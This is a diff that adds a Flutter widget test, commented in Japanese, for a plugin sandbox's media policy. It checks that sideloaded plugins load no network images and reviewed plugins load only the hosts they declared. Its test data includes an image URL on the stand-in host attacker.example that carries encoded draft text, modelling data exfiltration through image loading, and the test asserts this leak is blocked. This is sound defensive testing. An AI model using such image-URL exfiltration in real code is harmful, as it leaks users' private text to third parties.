@@ -20,6 +20,7 @@ import 'package:rasq_client/features/plugins/slot_plugins.dart';
 import 'package:rasq_client/features/vc/astell_fows.dart';
 import 'package:rasq_client/features/vc/astell_providers.dart';
 import 'package:rasq_client/session/session_storage.dart';
+import 'package:rasq_design/rasq_design.dart' show RasqMediaPolicy;
 import 'package:rasq_models/rasq_models.dart';
 import 'package:rasq_plugin_api/rasq_plugin_api.dart';
 
@@ -618,5 +619,53 @@ void main() {
     await tester.dragFrom(g(30, 30), Offset(120 * scale, 0));
     await tester.pumpAndSettle();
     expect(rt.calls.where((x) => x.$1 == 'obj.0.move' && x.$2['phase'] == 'end').last.$2.containsKey('snap'), isFalse);
+  });
+
+  testWidgets('D-407 (指摘 #9): 制限モードのプラグインの FOW は、下書きを入れた画像 URL を読まない。審査済み + network は宣言した接続先だけ', (tester) async {
+    const leak = 'https://attacker.example/p.png?d=%E4%B8%8B%E6%9B%B8%E3%81%8D';
+    Map<String, Object?> images() => {
+          't': 'Column',
+          'k': 'root',
+          'c': [
+            {'t': 'Image', 'k': 'leak', 'p': {'src': leak}},
+            {'t': 'Image', 'k': 'ok', 'p': {'src': 'https://cdn.allowed.example/ok.png'}},
+            {'t': 'Avatar', 'k': 'av', 'p': {'user': {'displayName': 'x', 'handle': 'x', 'avatarUrl': '$leak&a'}}},
+            {'t': 'Text', 'k': 't', 'p': {'text': '画像の面'}},
+          ],
+        };
+    List<String> loaded() => [
+          for (final img in tester.widgetList<Image>(find.byType(Image)))
+            if (img.image case final NetworkImage n)
+              if (n.url.contains('attacker.example') || n.url.contains('cdn.allowed.example')) n.url, // ホストの画面(SNS のアイコン等)は除く
+        ];
+    final netManifest = {
+      ...manifest('t.leak', ['composer.text'], permissions: ['fow.widget', RasqPermissions.network]),
+      'network': {'hosts': ['cdn.allowed.example']},
+    };
+    late FakeSlotRuntime side, store;
+    fakes['leak'] = () => side = FakeSlotRuntime(manifest: netManifest, handler: (_, _, _) => {});
+    fakes['store:t.leak2'] = () => store = FakeSlotRuntime(manifest: {...netManifest, 'id': 't.leak2'}, handler: (_, _, _) => {}, scopeName: 'fake:store');
+    final c = await pump(tester);
+    // サイドロード(署名なし)= 制限モード: network を宣言していても、面では端末内だけ。
+    final p = await register(c, 'leak');
+    expect(p.capabilities.networkEnabled, isFalse);
+    expect(p.mediaPolicy.allows(Uri.parse(leak)), isFalse);
+    expect(p.mediaPolicy.allows(Uri.parse('https://cdn.allowed.example/ok.png')), isFalse);
+    side.openFow('w', images(), title: '制限の面');
+    await tester.pumpAndSettle();
+    expect(find.text('画像の面'), findsOneWidget);
+    expect(loaded(), isEmpty, reason: '制限モードの面からは通信しない');
+    side.closeFow('w');
+    await tester.pumpAndSettle();
+    // 審査済み(ストア)+ network + hosts: 宣言した接続先だけ読む。
+    final q = await register(c, 'leak2', reviewed: true);
+    expect(q.mediaPolicy.allows(Uri.parse('https://cdn.allowed.example/ok.png')), isTrue);
+    expect(q.mediaPolicy.allows(Uri.parse(leak)), isFalse);
+    store.openFow('w2', images(), title: '審査済みの面');
+    await tester.pumpAndSettle();
+    expect(loaded(), ['https://cdn.allowed.example/ok.png']);
+    // 審査済みでも network を宣言していなければ端末内だけ。
+    final noNet = SlotPlugin(manifest: SlotManifest.fromJson(manifest('t.n', ['composer.text'])), source: 'store:t.n', runtime: FakeSlotRuntime(manifest: const {}, handler: (_, _, _) => null));
+    expect(identical(noNet.mediaPolicy, RasqMediaPolicy.localOnly), isTrue);
   });
 }
